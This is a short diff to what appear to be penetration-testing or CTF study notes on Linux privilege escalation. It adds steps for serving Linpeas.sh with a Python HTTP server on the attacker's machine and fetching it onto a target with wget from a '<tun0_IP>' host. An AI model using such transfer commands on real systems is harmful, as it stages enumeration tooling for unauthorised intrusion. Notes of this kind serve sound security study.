@@ -849,10 +849,21 @@ Used responsibly, this is a great example of **local privilege escalation** via 
 * LinEnum.sh
 * Lse.sh
 
+---
 
+### send ``scripts`` to server:
 
+on folder that have ``Linpeas.sh``:
 
+```
+python3 -m http.server 8888
+```
 
+on server:
+
+```
+wget http://<tun0_IP>:8888/Linpeas.sh
+```
 
 
 
